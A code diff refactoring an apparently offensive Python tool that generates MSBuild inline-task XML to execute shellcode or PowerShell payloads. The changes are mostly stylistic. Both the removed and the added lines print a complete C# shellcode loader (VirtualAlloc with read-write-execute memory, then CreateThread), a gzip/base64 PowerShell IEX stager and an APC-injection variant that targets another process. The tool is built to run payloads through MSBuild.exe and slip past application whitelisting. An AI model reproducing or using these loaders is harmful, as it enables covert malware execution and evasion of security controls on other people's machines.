@@ -42,38 +42,23 @@ def getCompressedPayload(filePath, returnRaw = False):
         if returnRaw:
             return encoded
 
-    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
-        encoded.decode()
-    )
-    return powershell
+    return f"$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{encoded.decode()}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"
 
 def getPayloadCode(payload):
     return f'shellcode = "{payload}";'
 
-    payloadCode = '\n'
-
-    N = 50000
-    codeSlices = map(lambda i: payload[i:i+N], range(0, len(payload), N))
-
-    variables = []
-
-    num = 1
-    for code in codeSlices:
-        payloadCode += f'string shellcode{num} = "{code}";\n'
-        variables.append(f'shellcode{num}')
-        num += 1
-
-    concat = 'shellcode = ' + ' + '.join(variables) + ';\n'
-    payloadCode += concat
-
-    return payloadCode
-
 def getInlineTask(module, payload, _format, apc, targetProcess):
-    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
+    templateName = ''.join(
+        random.choice(string.ascii_letters)
+        for _ in range(random.randint(5, 15))
+    )
     if len(module) > 0:
         templateName = module
 
-    taskName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
+    taskName = ''.join(
+        random.choice(string.ascii_letters)
+        for _ in range(random.randint(5, 15))
+    )
 
     payloadCode = getPayloadCode(payload.decode())
     launchCode = ''
@@ -136,89 +121,9 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
     elif _format == 'raw':
         shellcodeLoader = ''
 
-        if not apc:
-            shellcodeLoader = string.Template('''<Task>
-    <Reference Include="System.Management.Automation" />
-      <Code Type="Class" Language="cs">
-        <![CDATA[       
-            using System.Management.Automation;
-            using System.Management.Automation.Runspaces;
-            using Microsoft.Build.Framework;
-            using Microsoft.Build.Utilities;
-            using System;
-            using System.Diagnostics;
-            using System.Reflection;
-            using System.Runtime.InteropServices;
-            using System.IO;
-            using System.IO.Compression;
-            using System.Text;
-
-            public class $templateName : Task {
-
-                [DllImport("kernel32")]
-                private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);
-
-                [DllImport("kernel32")]
-                private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
-
-                [DllImport("kernel32")]
-                private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );
-
-                [DllImport("kernel32")]
-                private static extern bool CloseHandle(IntPtr hHandle);
-
-                [DllImport("kernel32")]
-                private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );
-
-                private static UInt32 MEM_COMMIT = 0x1000;
-                private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-                private static UInt32 MEM_RELEASE = 0x8000;
-
-                public static byte[] DecompressString(string compressedText) {
-                    byte[] data = Convert.FromBase64String(compressedText);
-
-                    using (var ms = new MemoryStream(data)) {
-                        using (var gzip = new GZipStream(ms, CompressionMode.Decompress)) {
-                            using (var decompressed = new MemoryStream()) {
-                                gzip.CopyTo(decompressed);
-                                return decompressed.ToArray();
-                            }
-                        }
-                    }
-                }
-
-                public override bool Execute() {
-
-                    string shellcode = "";
-                    $payloadCode
-                    byte[] payload = DecompressString(shellcode);
-
-                    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                    Marshal.Copy(payload, 0, funcAddr, payload.Length);
-                    IntPtr hThread = IntPtr.Zero;
-                    UInt32 threadId = 0;
-
-                    hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
-                    WaitForSingleObject(hThread, 0xFFFFFFFF);
-
-                    CloseHandle(hThread);
-                    VirtualFree(funcAddr, 0, MEM_RELEASE);
-
-                    return true;
-                }                                
-            }           
-        ]]>
-      </Code>
-    </Task>''').safe_substitute(
-                templateName = templateName,
-                payloadCode = payloadCode
-            )
-        else:
-            #
-            # The below MSBuild template comes from:
-            #   https://github.com/infosecn1nja/MaliciousMacroMSBuild
-            #
-            shellcodeLoader = string.Template('''<Task>
+        shellcodeLoader = (
+            string.Template(
+                '''<Task>
   <Code Type="Class" Language="cs">
   <![CDATA[
     using System;
@@ -412,12 +317,91 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
       }
         ]]>
       </Code>
-    </Task>''').safe_substitute(
-        templateName = templateName,
-        payloadCode = payloadCode,
-        targetProcess = targetProcess
-    )
+    </Task>'''
+            ).safe_substitute(
+                templateName=templateName,
+                payloadCode=payloadCode,
+                targetProcess=targetProcess,
+            )
+            if apc
+            else string.Template(
+                '''<Task>
+    <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[       
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System;
+            using System.Diagnostics;
+            using System.Reflection;
+            using System.Runtime.InteropServices;
+            using System.IO;
+            using System.IO.Compression;
+            using System.Text;
 
+            public class $templateName : Task {
+
+                [DllImport("kernel32")]
+                private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);
+
+                [DllImport("kernel32")]
+                private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
+
+                [DllImport("kernel32")]
+                private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );
+
+                [DllImport("kernel32")]
+                private static extern bool CloseHandle(IntPtr hHandle);
+
+                [DllImport("kernel32")]
+                private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );
+
+                private static UInt32 MEM_COMMIT = 0x1000;
+                private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+                private static UInt32 MEM_RELEASE = 0x8000;
+
+                public static byte[] DecompressString(string compressedText) {
+                    byte[] data = Convert.FromBase64String(compressedText);
+
+                    using (var ms = new MemoryStream(data)) {
+                        using (var gzip = new GZipStream(ms, CompressionMode.Decompress)) {
+                            using (var decompressed = new MemoryStream()) {
+                                gzip.CopyTo(decompressed);
+                                return decompressed.ToArray();
+                            }
+                        }
+                    }
+                }
+
+                public override bool Execute() {
+
+                    string shellcode = "";
+                    $payloadCode
+                    byte[] payload = DecompressString(shellcode);
+
+                    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                    Marshal.Copy(payload, 0, funcAddr, payload.Length);
+                    IntPtr hThread = IntPtr.Zero;
+                    UInt32 threadId = 0;
+
+                    hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
+                    WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+                    CloseHandle(hThread);
+                    VirtualFree(funcAddr, 0, MEM_RELEASE);
+
+                    return true;
+                }                                
+            }           
+        ]]>
+      </Code>
+    </Task>'''
+            ).safe_substitute(
+                templateName=templateName, payloadCode=payloadCode
+            )
+        )
         launchCode = shellcodeLoader
 
     else:
@@ -475,7 +459,8 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
         launchCode = powershellLaunchCode
 
 
-    template = string.Template('''<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    return string.Template(
+        '''<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 
   <!--  Based on Casey Smith work, Twitter: @subTee                      -->
   <!--  Automatically generated using `generateMSBuildXML.py` utility    -->
@@ -488,13 +473,10 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
     AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
     $launchCode
   </UsingTask>
-</Project>''').safe_substitute(
-        taskName = taskName,
-        templateName = templateName,
-        launchCode = launchCode
+</Project>'''
+    ).safe_substitute(
+        taskName=taskName, templateName=templateName, launchCode=launchCode
     )
-
-    return template
 
 def detectFileIsExe(filePath, forced = False):
     try:
@@ -620,13 +602,12 @@ def main(argv):
 
         if args.inputFile.endswith('.exe'):
             return False
-            
+
     payload = getCompressedPayload(args.inputFile, _format != 'powershell')
     output = getInlineTask(args.module, payload, _format, args.queue_apc, args.target_process)
 
-    if args.only_csharp:
-        m = re.search(r'\<\!\[CDATA\[(.+)\]\]\>', output, re.M|re.S)
-        if m:
+    if m := re.search(r'\<\!\[CDATA\[(.+)\]\]\>', output, re.M | re.S):
+        if args.only_csharp:
             output = m.groups(0)[0]
 
     if args.minimize:
@@ -638,12 +619,11 @@ def main(argv):
                 f.write(base64.b64encode(output))
         else:
             print(base64.b64encode(output))
+    elif len(args.output) > 0:
+        with open(args.output, 'w') as f:
+            f.write(output)
     else:
-        if len(args.output) > 0:
-            with open(args.output, 'w') as f:
-                f.write(output)
-        else:
-            print(output)
+        print(output)
 
     msbuildPath = r'%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe'
     if 'PROGRAMFILES(X86)' in os.environ:
